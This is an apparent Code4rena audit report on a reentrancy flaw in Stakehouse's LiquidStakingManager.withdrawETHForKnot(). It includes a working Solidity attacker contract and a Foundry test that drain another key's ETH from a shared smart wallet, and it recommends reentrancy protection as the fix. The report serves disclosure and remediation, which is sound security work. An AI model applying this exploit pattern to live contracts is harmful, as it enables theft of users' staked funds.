# Original link
https://github.com/code-423n4/2022-11-stakehouse-findings/issues/288
# Lines of code

https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326


# Vulnerability details

## Impact

The ```LiquidStakingManager.sol::withdrawETHForKnot()``` allows to the BLSPubkey to withdraw from their smart wallet. The smartwallets can have multiple BLSPubKeys. The problem is that one BLSPubkey can withdraw the ether from the others BLSpubkeys on the same smartwallet.

The [LiquidStakingManager.sol::withdrawETHForKnot()](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326) does not protect from reentrancy attack and with [this external call](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L340) the ```_recipient``` (malicious contract) can call the ```LiquidStakingManager.sol::withdrawETHForKnot()``` function again and extract all the funds from the others blspubkeys from the shared smartwallet.

## Proof of Concept

I wrote a test for the reentrancy. 

1. As a malicious contract register two BLSPubKeys for the same smartwallet.
2. Add the malicious contract as a noderunner.
3. As the malicious contract, withdraw from one BLSPubKeyOne and in the recipient parameter add the malicious contract address which will do the reentrant and get the balance from all the BLSPubKeys from the smart wallet.

**Test:**

```solidity
// MockMaliciousContract.sol
// SPDX-License-Identifier: MIT
import { LiquidStakingManager } from "../../contracts/liquid-staking/LiquidStakingManager.sol";
pragma solidity 0.8.13;


contract MockMaliciousContract {

    address manager;
    bytes blsPublicKeyOfKnot;
    uint256 counter;

    function registerBLS(
        address _manager,
        uint256 stakeAmount,
        bytes[] calldata _blsPublicKeys,
        bytes[] calldata _blsSignatures,
        address _eoaRepresentative) external {
            manager = _manager;
            (bool success, bytes memory result) = manager.call{value: stakeAmount}(
                abi.encodeWithSignature(
                    "registerBLSPublicKeys(bytes[],bytes[],address)",
                    _blsPublicKeys,
                    _blsSignatures,
                    _eoaRepresentative)
            );
            if (!success) {
                if (result.length < 68) revert();
                assembly {
                    result := add(result, 0x04)
                    }
                revert(abi.decode(result, (string)));
            }
    }

    function withdrawETHForKnot(bytes calldata _blsPublicKeyOfKnot) external {
        blsPublicKeyOfKnot = _blsPublicKeyOfKnot;
        (bool success, bytes memory result) = manager.call(
            abi.encodeWithSignature(
                "withdrawETHForKnot(address,bytes)",
                address(this),
                blsPublicKeyOfKnot)
        );
        if (!success) {
            if (result.length < 68) revert();
            assembly {
                result := add(result, 0x04)
                }
            revert(abi.decode(result, (string)));
        }
    }

    function depositToContract() external payable {}

    // Fallback
    fallback() external payable {
        ++counter;
        if (counter < 2) {
            (bool success, bytes memory result) = manager.call(
                abi.encodeWithSignature(
                    "withdrawETHForKnot(address,bytes)",
                    address(this),
                    blsPublicKeyOfKnot)
            );
            if (!success) {
                if (result.length < 68) revert();
                assembly {
                    result := add(result, 0x04)
                    }
                revert(abi.decode(result, (string)));
            }
        }
    }
}
```

```solidity
// LSDNFactory.t.sol
// forge test -m "test_0xbepresent_RegisterKeysAndWithdrawETHReentrancy" -vvv
import { MockMaliciousContract } from "../../contracts/testing/MockMaliciousContract.sol";

function test_0xbepresent_RegisterKeysAndWithdrawETHReentrancy() public {
    //
    // Reentrancy on LiquidStakingManager.sol::withdrawETHForKnot()
    // 1. As the malicious contract. Register TWO pubkeys to the same smartwallet
    // 2. Add malicious contract as a noderunner
    // 3. As the malicious contract, withDrawETHForKnot. Reentrant and get all the balance from the SmartWallet
    // Get the balance from blsPubKeyOne and blsPubKeyTwo
    address house = address(new StakeHouseRegistry());
    MockMaliciousContract maliciouscontract = new MockMaliciousContract();

    uint256 nodeStakeAmount = 8 ether;

    // Give the malicious contract ether
    address xuser = accountThree; vm.deal(xuser, 24 ether);
    vm.prank(xuser);
    maliciouscontract.depositToContract{value: 10 ether}();
    assertEq(address(maliciouscontract).balance, 10 ether);

    address eoaRepresentative = accountTwo;

    MockAccountManager(manager.accountMan()).setLifecycleStatus(blsPubKeyOne, 0);

    //
    // 1. As the malicious contract. Register TWO pubkeys to the same smartwallet
    //
    maliciouscontract.registerBLS(
        address(manager),
        nodeStakeAmount,
        getBytesArrayFromBytes(blsPubKeyOne, blsPubKeyTwo),
        getBytesArrayFromBytes(blsPubKeyOne, blsPubKeyTwo),
        eoaRepresentative);

    //
    // 2. Add malicious contract as a noderunner
    //
    address nodeRunner = address(maliciouscontract);

    // Check the nodeRunner (maliciouscontract) is registered
    MockAccountManager(manager.accountMan()).setLifecycleStatus(blsPubKeyOne, 1);
    MockAccountManager(manager.accountMan()).setLifecycleStatus(blsPubKeyTwo, 1);
    manager.setIsPartOfNetwork(blsPubKeyOne, true);
    manager.setIsPartOfNetwork(blsPubKeyTwo, true);
    address nodeRunnerSmartWallet = manager.smartWalletOfNodeRunner(nodeRunner);
    assertEq(nodeRunnerSmartWallet.balance, 8 ether);
    assertEq(address(maliciouscontract).balance, 2 ether);

    //
    // 3. As the malicious contract, withDrawETHForKnot. Reentrant and get all the balance from the SmartWallet
    // Get the balance from blsPubKeyOne and blsPubKeyTwo
    //
    maliciouscontract.withdrawETHForKnot(
        blsPubKeyOne
    );
    assertEq(address(maliciouscontract).balance, 10 ether);  // I can get 8 eth
}
```


## Tools used
Foundry/VisualStudio

## Recommended Mitigation Steps

Add a reentrant protection.
